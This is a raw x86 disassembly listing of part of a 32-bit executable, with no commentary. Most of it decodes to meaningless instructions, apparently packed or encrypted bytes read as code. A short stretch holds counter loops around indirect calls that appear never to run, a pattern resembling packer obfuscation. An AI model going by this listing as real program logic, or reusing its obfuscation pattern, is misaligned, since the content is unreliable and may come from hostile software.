  40ab89:	adc    eax,0xb65453e7
  40ab8e:	cmp    BYTE PTR [edi+esi*1+0x36e98a0f],0x73
  40ab96:	fidivr WORD PTR [ebx+0x0]
  40ab99:	test   DWORD PTR [esi+0x46],edi
  40ab9c:	sbb    cl,BYTE PTR [ebx+0x687698db]
  40aba2:	add    ecx,edx
  40aba4:	out    0xd9,eax
  40aba6:	xor    al,0xec
  40aba8:	add    al,0x8e
  40abaa:	fdiv   st(5),st
  40abac:	jae    0x40ab91
  40abae:	push   edx
  40abaf:	rcr    dh,cl
  40abb1:	lods   al,BYTE PTR ss:[esi]
  40abb3:	mov    esi,0x9096174a
  40abb8:	inc    esi
  40abb9:	imul   eax,DWORD PTR [esi],0xffffffc3
  40abbc:	shl    BYTE PTR [edx],1
  40abbe:	enter  0x839f,0xeb
  40abc2:	jno    0x40ac3b
  40abc4:	stc    
  40abc5:	mov    BYTE PTR [ebp-0x1b14e60c],dl
  40abcb:	loope  0x40ab8e
  40abcd:	lea    esp,[ebp+0x73c9bb07]
  40abd3:	out    0x41,al
  40abd5:	mov    BYTE PTR [esi+0xa],bl
  40abd8:	test   BYTE PTR [esi+0x45fec7c0],cl
  40abde:	loope  0x40ac5b
  40abe0:	xchg   esp,eax
  40abe1:	repnz neg DWORD PTR [edi+0x65ddfee8]
  40abe8:	jnp    0x40ac3d
  40abea:	dec    ecx
  40abeb:	add    BYTE PTR [esi-0x126426b8],ah
  40abf1:	ins    DWORD PTR es:[edi],dx
  40abf2:	(bad)  
  40abf3:	xor    BYTE PTR [ecx-0x5b],ch
  40abf6:	xchg   DWORD PTR [eax-0x54b9a0b],ecx
  40abfc:	inc    esp
  40abfd:	jle    0x40abf3
  40abff:	cld    
  40ac00:	sbb    bh,dh
  40ac02:	jb     0x40ac1a
  40ac04:	mov    ebx,0x6679f1
  40ac09:	stos   BYTE PTR es:[edi],al
  40ac0a:	je     0x40ac7c
  40ac0c:	dec    esi
  40ac0d:	dec    edx
  40ac0e:	push   0x3f8aaa22
  40ac13:	loope  0x40ac32
  40ac15:	ror    BYTE PTR [ecx],1
  40ac17:	and    DWORD PTR [ebp-0xa],esp
  40ac1a:	es xchg esi,eax
  40ac1c:	xchg   ebx,eax
  40ac1d:	icebp  
  40ac1e:	jbe    0x40ac32
  40ac20:	and    BYTE PTR [edx+0x61],0xc1
  40ac24:	ret    0x2385
  40ac27:	mov    al,0xdd
  40ac29:	dec    ecx
  40ac2a:	or     esp,DWORD PTR [ecx]
  40ac2c:	test   BYTE PTR [ecx],al
  40ac2e:	jne    0x40ac69
  40ac30:	jnp    0x40ac41
  40ac32:	aaa    
  40ac33:	call   0xac95:0xefc40a
  40ac3a:	mov    bl,ah
  40ac3c:	xor    al,0xcd
  40ac3e:	fisttp WORD PTR [esi]
  40ac40:	jle    0x40abe4
  40ac42:	mov    cl,bh
  40ac44:	mov    cl,0xbd
  40ac46:	outs   dx,DWORD PTR ds:[esi]
  40ac47:	jns    0x40ac3b
  40ac49:	pop    edi
  40ac4a:	ret    0xf6f3
  40ac4d:	sub    BYTE PTR [edi+eiz*8+0x4d],0x5f
  40ac52:	push   ebx
  40ac53:	xchg   edx,eax
  40ac54:	das    
  40ac55:	fst    DWORD PTR [ecx-0x20]
  40ac58:	dec    ebp
  40ac59:	sar    BYTE PTR [edi+0x67],cl
  40ac5c:	out    0x9e,eax
  40ac5e:	adc    DWORD PTR [edx],edx
  40ac60:	ss sub eax,0x7062b42c
  40ac66:	aas    
  40ac67:	test   ecx,esp
  40ac69:	sbb    al,0xb6
  40ac6b:	xchg   BYTE PTR [esi-0x3],ah
  40ac6e:	out    0xc2,al
  40ac70:	imul   DWORD PTR ss:[esi+0x42]
  40ac74:	loope  0x40ace4
  40ac76:	rcr    BYTE PTR [ecx-0x23],0xf8
  40ac7a:	or     eax,0xbb1e8f22
  40ac7f:	pop    ds
  40ac80:	retf   0xd11b
  40ac83:	ror    BYTE PTR [eax+0xe],0x0
  40ac87:	dec    eax
  40ac88:	adc    ch,BYTE PTR ds:[esi]
  40ac8b:	or     eax,0x38a63dae
  40ac90:	inc    eax
  40ac91:	lahf   
  40ac92:	nop
  40ac93:	(bad)  
  40ac94:	jmp    0x8efec51a
  40ac99:	jmp    0x5027ddf1
  40ac9e:	call   0xe6473e5f
  40aca3:	mov    eax,0x5627a682
  40aca8:	fs dec esp
  40acaa:	mov    ds:0x3e45a6dc,al
  40acaf:	test   eax,0x5e33aa37
  40acb4:	fs loopne 0x40ac6f
  40acb7:	xchg   ebp,eax
  40acb8:	push   es
  40acb9:	ror    edi,0xa3
  40acbc:	sbb    al,0x50
  40acbe:	inc    eax
  40acbf:	ret    
  40acc0:	push   esp
  40acc1:	ins    BYTE PTR es:[edi],dx
  40acc2:	add    bl,BYTE PTR ds:0x2f2de02a
  40acc8:	cld    
  40acc9:	sub    al,bh
  40accb:	and    ecx,edi
  40accd:	mov    edi,DWORD PTR [ecx-0x256351b1]
  40acd3:	inc    ecx
  40acd4:	cmp    al,0x85
  40acd6:	xchg   esp,eax
  40acd7:	into   
  40acd8:	xchg   esi,eax
  40acd9:	stc    
  40acda:	fisubr DWORD PTR [ebp-0x5f51685b]
  40ace0:	push   0x7c
  40ace2:	sub    edi,DWORD PTR ss:[edi+0x3292b2fa]
  40ace9:	add    dh,ah
  40aceb:	add    eax,0x26207175
  40acf0:	cmp    eax,0x2b790651
  40acf5:	ins    DWORD PTR es:[edi],dx
  40acf6:	jecxz  0x40acf3
  40acf8:	pop    esp
  40acf9:	pop    ss
  40acfa:	call   0x61e33d01
  40acff:	in     al,dx
  40ad00:	xchg   ebx,eax
  40ad01:	addr16 dec esi
  40ad03:	fs cs cmc 
  40ad06:	add    eax,0xf0f007be
  40ad0b:	imul   ecx,DWORD PTR [edx-0x7eddb77f],0x6c017faa
  40ad15:	aaa    
  40ad16:	add    BYTE PTR [eax-0x52],cl
  40ad19:	cld    
  40ad1a:	pop    ds
  40ad1b:	xchg   DWORD PTR ds:0x998c4575,edi
  40ad21:	xor    al,0x28
  40ad23:	push   ds
  40ad24:	int    0x1c
  40ad26:	mov    BYTE PTR [edi-0x6c3c4f],al
  40ad2c:	ja     0x40acc9
  40ad2e:	push   edx
  40ad2f:	adc    edx,DWORD PTR [edx+0x4d]
  40ad32:	fucomip st,st(7)
  40ad34:	ret    0xb6a3
  40ad37:	int3   
  40ad38:	imul   ecx
  40ad3a:	jbe    0x40ace5
  40ad3c:	ret    
  40ad3d:	push   0xc83479da
  40ad42:	cmp    dl,BYTE PTR [ebx+ecx*2-0x305a0712]
  40ad49:	pop    ecx
  40ad4a:	ret    
  40ad4b:	stos   DWORD PTR es:[edi],eax
  40ad4c:	cwde   
  40ad4d:	inc    ebp
  40ad4e:	rcl    ebx,0xd1
  40ad51:	push   eax
  40ad52:	mov    dh,0x2f
  40ad54:	cmp    DWORD PTR ds:0x402e7ab7,esi
  40ad5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad5b:	jne    0x40ad6c
  40ad5d:	inc    ecx
  40ad5e:	out    dx,al
  40ad5f:	adc    BYTE PTR [ebx-0x7b5437a6],dh
  40ad65:	cwde   
  40ad66:	sahf   
  40ad67:	add    dl,BYTE PTR [edi+0x5d8cff25]
  40ad6d:	popa   
  40ad6e:	dec    edx
  40ad6f:	push   eax
  40ad70:	jae    0x40ad62
  40ad72:	std    
  40ad73:	neg    BYTE PTR [edx]
  40ad75:	and    esp,DWORD PTR [eax]
  40ad77:	pop    ss
  40ad78:	out    dx,eax
  40ad79:	(bad)  
  40ad7a:	aaa    
  40ad7b:	or     esi,ebx
  40ad7d:	cmp    DWORD PTR [edi+0x53],0x5f819561
  40ad84:	into   
  40ad85:	cs fsub st(4),st
  40ad88:	inc    ebx
  40ad89:	mov    dh,0x9e
  40ad8b:	mov    esp,0xa9c65073
  40ad90:	mov    ds:0x47d6faff,al
  40ad95:	add    edx,DWORD PTR [ebx+0x7c]
  40ad98:	lods   eax,DWORD PTR ds:[esi]
  40ad99:	dec    esi
  40ad9a:	push   eax
  40ad9b:	test   DWORD PTR [ebx+0x50c7d7ce],esi
  40ada1:	xor    BYTE PTR [edx],bl
  40ada3:	sub    edi,DWORD PTR [edx+0x15c02f01]
  40ada9:	pop    es
  40adaa:	jno    0x40addd
  40adac:	sbb    ah,dh
  40adae:	je     0x40adc0
  40adb0:	jle    0x40adef
  40adb2:	aaa    
  40adb3:	lock xchg BYTE PTR [ecx-0x7b],ah
  40adb7:	push   eax
  40adb8:	pop    esi
  40adb9:	mov    dl,BYTE PTR [eax-0x4d1cfaf]
  40adbf:	xchg   DWORD PTR [edx],esi
  40adc1:	jmp    0x773a990d
  40adc6:	cmp    DWORD PTR [ebp+edi*8-0x1bd350ee],ecx
  40adcd:	sub    bl,ch
  40adcf:	fidivr DWORD PTR [edi]
  40add1:	push   cs
  40add2:	xchg   esp,eax
  40add3:	or     BYTE PTR [edx+ecx*1+0x78f1ee63],dl
  40adda:	jg     0x40adf2
  40addc:	les    ecx,FWORD PTR ds:0xc34dd3e9
  40ade2:	sbb    bh,BYTE PTR [ebx-0x55d380a9]
  40ade8:	ins    DWORD PTR es:[edi],dx
  40ade9:	dec    ecx
  40adea:	inc    edi
  40adeb:	je     0x40ae2e
  40aded:	fisub  WORD PTR [ecx+0x330fb8e9]
  40adf3:	loopne 0x40ae6f
  40adf5:	mov    dh,0xa5
  40adf7:	push   edi
  40adf8:	lods   al,BYTE PTR ds:[esi]
  40adf9:	imul   esi,DWORD PTR [edi],0x8aa63a3e
  40adff:	jo     0x40ad85
  40ae01:	int    0x9a
  40ae03:	cwde   
  40ae04:	add    DWORD PTR [eax+0x4d5df551],0x60
  40ae0b:	adc    eax,0xbdc5702c
  40ae10:	inc    eax
  40ae11:	mov    edx,0x92679dee
  40ae16:	or     al,0xbd
  40ae18:	icebp  
  40ae19:	popf   
  40ae1a:	ins    DWORD PTR es:[edi],dx
  40ae1b:	push   ecx
  40ae1c:	mov    eax,0x21017977
  40ae21:	int3   
  40ae22:	ret    
  40ae23:	push   ebx
  40ae24:	mov    WORD PTR [ebx],es
  40ae26:	(bad)
  40ae29:	daa    
  40ae2a:	ret    0xe1a6
  40ae2d:	dec    BYTE PTR [ebx-0x53]
  40ae30:	mov    WORD PTR [ebx+eiz*2+0x310c7957],fs
  40ae37:	xchg   BYTE PTR [ebp-0x286ac8f3],dl
  40ae3d:	mov    dl,BYTE PTR [edi]
  40ae3f:	lahf   
  40ae40:	cs mov ah,BYTE PTR gs:[ebp-0x5d1192b5]
  40ae48:	loope  0x40ae1c
  40ae4a:	push   esp
  40ae4b:	pusha  
  40ae4c:	jne    0x40ae1c
  40ae4e:	fisub  WORD PTR [edi]
  40ae50:	fxch   st(1)
  40ae52:	mov    edx,0x54eff262
  40ae57:	xchg   esp,eax
  40ae58:	sbb    eax,0xd4d5ffdd
  40ae5d:	add    DWORD PTR [ecx],ecx
  40ae5f:	push   eax
  40ae60:	or     eax,0xe8b37501
  40ae65:	and    DWORD PTR [ebp-0x5a25076d],edx
  40ae6b:	dec    esp
  40ae6c:	adc    dl,bl
  40ae6e:	ror    BYTE PTR [eax+eax*2],1
  40ae71:	repnz aas 
  40ae73:	pop    ecx
  40ae74:	gs scas eax,DWORD PTR es:[edi]
  40ae76:	inc    esp
  40ae77:	daa    
  40ae78:	pop    esi
  40ae79:	int    0x8b
  40ae7b:	and    bl,BYTE PTR [ebp-0x1f]
  40ae7e:	xchg   ebx,eax
  40ae7f:	mov    ds:0xb2aece2d,al
  40ae84:	mov    ebx,edx
  40ae86:	or     eax,0xf6dba9ac
  40ae8b:	(bad)  
  40ae8c:	aad    0xab
  40ae8e:	lds    eax,FWORD PTR [edi+esi*2+0x6b]
  40ae92:	or     dl,BYTE PTR [edi]
  40ae94:	jb     0x40ae92
  40ae96:	aad    0x14
  40ae98:	pop    ebp
  40ae99:	cdq    
  40ae9a:	pmulhw mm1,QWORD PTR [eax]
  40ae9d:	in     al,0x59
  40ae9f:	sbb    esp,DWORD PTR ds:0x61f26a9
  40aea5:	sub    al,0x41
  40aea7:	and    BYTE PTR [ebx],dh
  40aea9:	imul   edi,DWORD PTR [ecx-0x69d2bb13],0x7f
  40aeb0:	addr16 add bh,bh
  40aeb3:	aas    
  40aeb4:	hlt    
  40aeb5:	pop    ds
  40aeb6:	adc    al,0x62
  40aeb8:	push   ebp
  40aeb9:	sbb    eax,0x9f416d40
  40aebe:	jl     0x40af27
  40aec0:	xor    eax,0xc00fe154
  40aec5:	sub    al,0xce
  40aec7:	sti    
  40aec8:	ds (bad) 
  40aeca:	ffreep st(0)
  40aecc:	cmp    dh,bh
  40aece:	daa    
  40aecf:	dec    esp
  40aed0:	add    edx,ecx
  40aed2:	imul   edx,edi
  40aed5:	xor    ebx,DWORD PTR ds:0x434553
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x434547,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x43453f,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x4345ff,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43458f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x4344ef,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x43453b,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x434547,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x434547
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x434547,ebx
  40af4d:	cmp    DWORD PTR ds:0x434547,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x434547,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x434577
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43458b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434613,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434613
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434613,ebx
  40afaa:	cmp    DWORD PTR ds:0x434613,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434613,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	das    
  40affc:	xlat   BYTE PTR ds:[ebx]
  40affd:	enter  0xf693,0xfa
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	sub    eax,0xa56f0fb8
  40b00c:	call   0x8f0df4cc
  40b011:	lock stos DWORD PTR es:[edi],eax
  40b013:	mov    ah,0xcc
  40b015:	push   ss
  40b016:	or     eax,0x5de1ad6e
  40b01b:	fucomip st,st(0)
  40b01d:	or     esi,DWORD PTR [edx]
  40b01f:	jp     0x40afb1
  40b021:	push   ebx
  40b022:	out    0x14,al
  40b024:	jmp    0xdae68e67
  40b029:	jge    0x40afb4
  40b02b:	retf   
  40b02c:	sbb    eax,0x90f9f0c8
  40b031:	ins    DWORD PTR es:[edi],dx
  40b032:	not    BYTE PTR [eax-0x43e11fd1]
  40b038:	lea    eax,[edx+0x71]
  40b03b:	pop    eax
  40b03c:	jge    0x40b076
  40b03e:	or     al,0xde
  40b040:	sub    eax,0x9372f0ca
  40b045:	out    0x30,eax
  40b047:	pop    esp
  40b048:	test   al,0xa7
  40b04a:	cli    
  40b04b:	mov    edi,0x44aa21e9
  40b050:	pop    es
  40b051:	mov    eax,0x85e3606f
  40b056:	mov    BYTE PTR [ecx],bh
  40b058:	jbe    0x40b01d
  40b05a:	add    eax,0xb4b22b84
  40b05f:	jge    0x40b0d5
  40b061:	icebp  
  40b062:	jl     0x40aff2
  40b064:	pop    ds
  40b065:	js     0x40b03e
  40b067:	outs   dx,DWORD PTR ds:[esi]
  40b068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b069:	daa    
  40b06a:	xor    eax,0xb462e6b2
  40b06f:	push   cs
  40b070:	dec    esp
  40b071:	jle    0x40b0d0
  40b073:	loope  0x40aff5
  40b075:	pusha  
  40b076:	or     ebx,DWORD PTR [edx+0xaa76c11]
  40b07c:	in     al,dx
  40b07d:	scas   eax,DWORD PTR es:[edi]
  40b07e:	push   ds
  40b07f:	pop    ebp
  40b080:	shl    bl,cl
  40b082:	out    0xd6,eax
  40b084:	cmp    DWORD PTR ds:0xe16e9672,0xffffff81
  40b08b:	call   0x3fe6:0x3c9e1630
  40b092:	repz das 
  40b094:	pop    esi
  40b095:	push   0x5386719b
  40b09a:	fidiv  DWORD PTR [esi]
  40b09c:	cmc    
  40b09d:	or     eax,0x8b3437ad
  40b0a2:	xchg   ecx,eax
  40b0a3:	pop    ds
  40b0a4:	or     BYTE PTR [esp+ebx*2+0x2d],cl
  40b0a8:	div    BYTE PTR [ebx+0x7890a824]
  40b0ae:	jp     0x40b0a5
  40b0b0:	xchg   ecx,eax
  40b0b1:	lea    esi,[ebp+0x7a23c124]
  40b0b7:	or     eax,0x4726ae5a
  40b0bc:	jne    0x40b099
  40b0be:	add    al,0x68
  40b0c0:	mov    bl,0xfe
  40b0c2:	fldenv [ecx]
  40b0c4:	xor    DWORD PTR [edi+0x25349500],0xffffffac
  40b0cb:	jns    0x40b0cc
  40b0cd:	adc    eax,0xc85a87
  40b0d2:	stos   BYTE PTR es:[edi],al
  40b0d3:	sub    dh,BYTE PTR [ebp-0x40]
  40b0d6:	pop    eax
  40b0d7:	xor    ch,BYTE PTR [eax-0x3b]
  40b0da:	adc    ecx,DWORD PTR [ebp-0x7b]
  40b0dd:	mov    edi,0xa8203d32
  40b0e2:	add    ch,BYTE PTR [edi+0x62]
  40b0e5:	cld    
  40b0e6:	data16 stc 
  40b0e8:	hlt    
  40b0e9:	icebp  
  40b0ea:	mov    ebp,0x804bc833
  40b0ef:	xor    ecx,DWORD PTR ds:0x45eb3317
  40b0f5:	mov    ebx,0x520a7b04
  40b0fa:	jg     0x40b11e
  40b0fc:	lahf   
  40b0fd:	rcl    DWORD PTR [edi],1
  40b0ff:	into   
  40b100:	sub    ah,ch
  40b102:	aad    0x35
  40b104:	lock inc ebp
  40b106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b107:	int3   
  40b108:	jbe    0x40b14c
  40b10a:	xchg   esi,eax
  40b10b:	xlat   BYTE PTR ds:[ebx]
  40b10c:	out    0x37,eax
  40b10e:	bound  edi,QWORD PTR [edx]
  40b110:	fnstenv [eax+0x36628401]
  40b116:	jnp    0x40b0a8
  40b118:	adc    al,0xa1
  40b11a:	pop    ebx
  40b11b:	cmp    BYTE PTR [edi+0x49],ah
  40b11e:	add    esi,DWORD PTR [eax]
  40b120:	sub    BYTE PTR [edx+eax*1],dl
  40b123:	sub    eax,0x2eaeb7b3
  40b128:	push   ebx
  40b129:	mov    cl,0x5d
  40b12b:	lods   al,BYTE PTR ds:[esi]
  40b12c:	push   0xfffffffc
  40b12e:	popa   
  40b12f:	dec    eax
  40b130:	push   es
  40b131:	ret    0xfd29
  40b134:	xchg   ebx,eax
  40b135:	mov    bh,0x9d
  40b137:	fiadd  DWORD PTR [esi-0x63]
  40b13a:	retf   
  40b13b:	(bad)  
  40b13c:	lahf   
  40b13d:	gs jmp 0x40b0ee
  40b140:	sbb    edi,ebx
  40b142:	xchg   esp,eax
  40b143:	and    DWORD PTR [ebx+0x5663116c],ebx
  40b149:	cdq    
  40b14a:	cld    
  40b14b:	loopne 0x40b190
  40b14d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40b14f:	stos   BYTE PTR es:[edi],al
  40b150:	in     eax,dx
  40b151:	dec    esi
  40b152:	and    ch,BYTE PTR [esi+0x3f05e7e1]
  40b158:	inc    ebp
  40b159:	jb     0x40b163
  40b15b:	pusha  
  40b15c:	xor    bh,BYTE PTR [ecx+0x4f]
  40b15f:	adc    eax,0x9f87c327
  40b164:	(bad)  
  40b165:	repz lock pop ds
  40b168:	imul   ebp,DWORD PTR [edx+0x12ac7917],0xe7202eab
  40b172:	cli    
  40b173:	xor    eax,eax
  40b175:	mov    bl,0x69
  40b177:	jmp    0x19b5:0x8ca7d9f0
  40b17e:	in     eax,0x90
  40b180:	ret    
  40b181:	fucomp st(7)
  40b183:	push   edi
  40b184:	jg     0x40b14c
  40b186:	addr16 add esp,eax
  40b189:	test   BYTE PTR [ebp-0x9],dh
  40b18c:	push   es
  40b18d:	xchg   edx,eax
  40b18e:	jmp    0x7f24:0x79b4a9ae
  40b195:	jl     0x40b17b
  40b197:	and    DWORD PTR [bp+0x7a],ebx
  40b19b:	cmp    eax,0xf42b96e5
  40b1a0:	push   ebx
  40b1a1:	je     0x40b171
  40b1a3:	(bad)  
  40b1a4:	loop   0x40b1e9
  40b1a6:	and    BYTE PTR [esi],bh
  40b1a8:	stc    
  40b1a9:	mov    edi,0xa0166a10
  40b1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1b0:	scas   eax,DWORD PTR es:[edi]
  40b1b1:	std    
  40b1b2:	and    ebp,DWORD PTR [ebx+0x43c39f13]
  40b1b8:	scas   eax,DWORD PTR es:[edi]
  40b1b9:	retf   0x9eee
  40b1bc:	xchg   esi,eax
  40b1bd:	lea    edi,[ecx-0x6b]
  40b1c0:	sbb    eax,0xf7eb4f76
  40b1c5:	loope  0x40b16e
  40b1c7:	add    ch,bl
  40b1c9:	push   esi
  40b1ca:	mov    ebp,0x1fd6c954
  40b1cf:	popf   
  40b1d0:	push   es
  40b1d1:	repnz or al,0x77
  40b1d4:	mov    edx,0x84b34e2a
  40b1d9:	add    dl,dh
  40b1db:	cmp    al,0x8e
  40b1dd:	sub    ah,0x60
  40b1e0:	pop    eax
  40b1e1:	dec    edi
  40b1e2:	xchg   edx,eax
  40b1e3:	loopne 0x40b1bd
  40b1e5:	inc    edx
  40b1e6:	add    al,0xb3
  40b1e8:	jmp    0x2eb1d000
  40b1ed:	std    
  40b1ee:	inc    ecx
  40b1ef:	shl    DWORD PTR [ecx],0x9e
  40b1f2:	xchg   bh,dh
  40b1f4:	rol    DWORD PTR [edi-0x3e67564b],1
  40b1fa:	add    BYTE PTR [esp+eax*4-0x19fb4765],dh
  40b201:	fidiv  WORD PTR [ecx-0x2d]
  40b204:	inc    eax
  40b205:	jl     0x40b263
  40b207:	push   ss
  40b208:	inc    esp
  40b209:	xchg   DWORD PTR [edi-0x197daa88],edx
  40b20f:	mov    BYTE PTR [edi-0x55072e43],dl
  40b215:	push   edx
  40b216:	inc    edi
  40b217:	or     DWORD PTR [ecx+0x48a7c3f6],eax
  40b21d:	add    eax,0xbc18a687
  40b222:	add    BYTE PTR [esi+0x61],bh
  40b225:	mov    DWORD PTR [esi+0x50],ecx
  40b228:	mov    cs,esi
  40b22a:	mov    ah,0x60
  40b22c:	pushf  
  40b22d:	lods   al,BYTE PTR ds:[esi]
  40b22e:	mov    al,BYTE PTR [edi-0x2c]
  40b231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b232:	xchg   edi,eax
  40b233:	mov    edi,0x151a6f09
  40b238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b239:	mov    dl,0xa5
  40b23b:	scas   al,BYTE PTR es:[edi]
  40b23c:	dec    edi
  40b23d:	(bad)  
  40b23f:	shr    ecx,cl
  40b241:	iret   
  40b242:	jle    0x40b1ee
  40b244:	inc    ecx
  40b245:	(bad)  
  40b247:	pop    ds
  40b248:	and    eax,0x6660004f
  40b24d:	cmp    BYTE PTR [edi],cl
  40b24f:	jg     0x40b27d
  40b251:	mov    dh,0x90
  40b253:	mov    ds,WORD PTR [edx-0x135ad5de]
  40b259:	ds inc eax
  40b25b:	mov    esp,0xf209ab3c
  40b260:	out    0x24,al
  40b262:	jb     0x40b2b4
  40b264:	mov    WORD PTR [edx-0x616a69c],ss
  40b26a:	arpl   WORD PTR [edx-0x58960f6],ax
  40b270:	ror    ch,0xbf
  40b273:	bound  ebx,QWORD PTR [esi]
  40b275:	repz pop ecx
  40b277:	outs   dx,DWORD PTR ds:[esi]
  40b278:	pop    esi
  40b279:	mov    dl,0x6d
  40b27b:	dec    edx
  40b27c:	out    dx,al
  40b27d:	jae    0x40b24b
  40b27f:	dec    ebp
  40b280:	stos   DWORD PTR es:[edi],eax
  40b281:	mov    ecx,0xf2a5a88a
  40b286:	dec    esp
  40b287:	and    edi,ecx
  40b289:	fild   DWORD PTR [eax+0x4b579872]
  40b28f:	stos   DWORD PTR es:[edi],eax
  40b290:	or     BYTE PTR [esi-0x49],0xd4
  40b294:	cmp    esp,ebp
  40b296:	dec    ecx
  40b297:	and    BYTE PTR [eax],0x4a
  40b29a:	outs   dx,DWORD PTR ds:[esi]
  40b29b:	mov    esp,esp
  40b29d:	or     al,ah
  40b29f:	xor    bl,BYTE PTR [ebx+eiz*8-0x13]
  40b2a3:	dec    edx
  40b2a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2a5:	and    esp,esi
  40b2a7:	jmp    0xdffb:0x21f53fe0
  40b2ae:	add    BYTE PTR [ebp+0x15],bl
  40b2b1:	rcr    DWORD PTR [ebp-0x52],1
  40b2b4:	sbb    bh,BYTE PTR [ebx+edi*2+0x52405b95]
  40b2bb:	ja     0x40b315
  40b2bd:	add    edi,esp
  40b2bf:	cmp    ah,dh
  40b2c1:	mov    ebp,0x4fea6c48
  40b2c6:	int    0xd3
  40b2c8:	fidivr DWORD PTR [ecx+edx*1+0xb15760f]
  40b2cf:	sbb    ah,dh
  40b2d1:	sbb    DWORD PTR [edi],esp
  40b2d3:	adc    BYTE PTR [ebx],bh
  40b2d5:	mov    dl,BYTE PTR [esi]
  40b2d7:	and    ecx,DWORD PTR [edx+0x13e68a0]
  40b2dd:	pop    ebp
  40b2de:	out    dx,al
  40b2df:	test   eax,0x8d0799a9
  40b2e4:	push   ecx
  40b2e5:	push   ds
  40b2e6:	sbb    eax,0x9d014f2
  40b2eb:	(bad)  
  40b2ed:	mov    al,0x4b
  40b2ef:	arpl   WORD PTR [eax],di
  40b2f1:	test   eax,0x58093599
  40b2f6:	mov    edi,0x6ae4c133
  40b2fb:	mov    al,ds:0x4e41242b
  40b300:	push   eax
  40b301:	push   es
  40b302:	pop    esp
  40b303:	lock pop esp
  40b305:	pop    edx
  40b306:	frstpm(287 only) 
  40b308:	call   0xebb4:0x90992f68
  40b30f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b310:	xor    eax,0x2f32ff2b
  40b315:	inc    edx
  40b316:	sub    cl,BYTE PTR [esi-0x46]
  40b319:	push   ebx
  40b31a:	nop
  40b31b:	in     eax,0xb7
  40b31d:	jg     0x40b312
  40b31f:	add    cl,dl
  40b321:	cdq    
  40b322:	jns    0x40b3a3
  40b324:	mov    ah,0x9f
  40b326:	sbb    eax,0x1ea85f65
  40b32b:	adc    DWORD PTR [edx-0x2194b77e],eax
  40b331:	cmp    DWORD PTR [ecx],ebx
  40b333:	adc    dl,BYTE PTR [edi+0x71]
  40b336:	imul   ecx,DWORD PTR [ebx+0x70],0xffffffac
  40b33a:	push   esp
  40b33b:	sbb    BYTE PTR [edi+0x4dcd2e77],bh
  40b341:	call   0x493ba13e
  40b346:	mov    DWORD PTR [ebp-0x4b67a1fb],0x335d89
  40b350:	and    BYTE PTR [edx+0x2c5ced8e],ch
  40b356:	and    BYTE PTR [eax],0xc4
  40b359:	mov    WORD PTR [edx-0x6992357e],gs
  40b35f:	or     al,0x86
  40b361:	inc    ecx
  40b362:	loopne 0x40b33c
  40b364:	ja     0x40b33f
  40b366:	out    0x96,eax
  40b368:	fmul   DWORD PTR [edi+0x4d]
  40b36b:	sub    BYTE PTR [ebx+0x60fceb96],al
  40b371:	ret    
  40b372:	jp     0x40b361
  40b374:	or     ebp,esi
  40b376:	sub    eax,0xc7a6e661
  40b37b:	push   esi
  40b37c:	loopne 0x40b2ff
  40b37e:	addr16 dec eax
  40b380:	pcmpeqb mm1,QWORD PTR [ebx+0x5ea6312a]
  40b387:	add    ebp,DWORD PTR [esi+0x7e24803b]
  40b38d:	jnp    0x40b3c1
  40b38f:	xchg   ebx,eax
  40b390:	mov    ds:0xf8265b7d,al
  40b395:	gs fwait
  40b397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b398:	adc    eax,0x96597082
  40b39d:	call   0x5317f45a
  40b3a2:	icebp  
  40b3a3:	nop
